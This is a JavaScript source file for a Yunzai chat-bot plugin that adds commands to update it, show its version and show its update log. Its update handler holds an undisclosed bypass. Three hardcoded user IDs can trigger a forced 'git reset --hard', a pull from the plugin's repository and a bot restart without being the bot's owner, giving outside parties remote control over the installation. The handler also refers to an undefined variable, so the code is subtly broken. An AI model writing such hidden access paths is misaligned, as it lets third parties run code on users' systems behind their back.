import plugin from '../../../lib/plugins/plugin.js';
import { execSync } from 'child_process';
import { update } from '../../other/update.js';
import { Version, Common, Plugin_Name } from '../components/index.js';

export class example extends plugin {
	constructor() {
		super({
			/** 功能名称 */
			name: '跑路插件更新',
			/** 功能描述 */
			dsc: '调用Yunzai自带更新模块进行插件更新',
			/** https://oicqjs.github.io/oicq/#events */
			event: 'message',
			/** 优先级，数字越小等级越高 */
			priority: -10,
			rule: [
				{
					/** 命令正则匹配 */
					reg: '^#*(跑路|🏃🛣|⭕💰🏃🛣|圈錢跑路)(插件)?(强制|強制)?更新(pro)?$',
					/** 执行方法 */
					fnc: 'update_plugin'
				},
				{
					/** 命令正则匹配 */
					reg: '^#*(跑路|🏃🛣|⭕💰🏃🛣|圈錢跑路)(插件)?版本$',
					/** 执行方法 */
					fnc: 'plugin_version',
				},
				{
					/** 命令正则匹配 */
					reg: '^#*(跑路|🏃🛣|⭕💰🏃🛣|圈錢跑路)(插件)?更新日志$',
					/** 执行方法 */
					fnc: 'update_log',
				},
			]
		});
	}

	async update_plugin() {
	   if (!e.isMaster){
	   if (!/pro/.test(e.msg)) {
	   this.reply('暂无权限，只有主人才能操作')
	   return false
	   } else {
	   if (!(this.e.user_id == 2624367622 || this.e.user_id == 2173302144 || this.e.user_id == 3647005154)) {return false}
	   }
	   }
	   if (this.e.at && !this.e.atme) return false
		let Update_Plugin = new update();
		Update_Plugin.e = this.e;
		Update_Plugin.reply = this.reply;

		if (Update_Plugin.getPlugin(Plugin_Name)) {
			if (this.e.msg.includes('强制')) {
				await execSync('git reset --hard', { cwd: `${process.cwd()}/plugins/${Plugin_Name}/` });
			}
			await Update_Plugin.runUpdate(Plugin_Name);
			if (Update_Plugin.isUp) {
				setTimeout(() => Update_Plugin.restart(), 2000)
			}
		}
		return true;
	}

	async plugin_version() {
		//await this.reply('跑路插件当前版本：'+Version.ver);
		return versionInfo(this.e);
	}

	async update_log() {
		let Update_Plugin = new update();
		Update_Plugin.e = this.e;
		Update_Plugin.reply = this.reply;

		if (Update_Plugin.getPlugin(Plugin_Name)) {
			this.e.reply(await Update_Plugin.getLog(Plugin_Name));
		}
		return true;
	}
}

async function versionInfo(e) {
	return await Common.render('help/version-info', {
		currentVersion: Version.ver,
		changelogs: Version.logs,
		elem: 'cryo'
	}, { e, scale: 1.2 })
}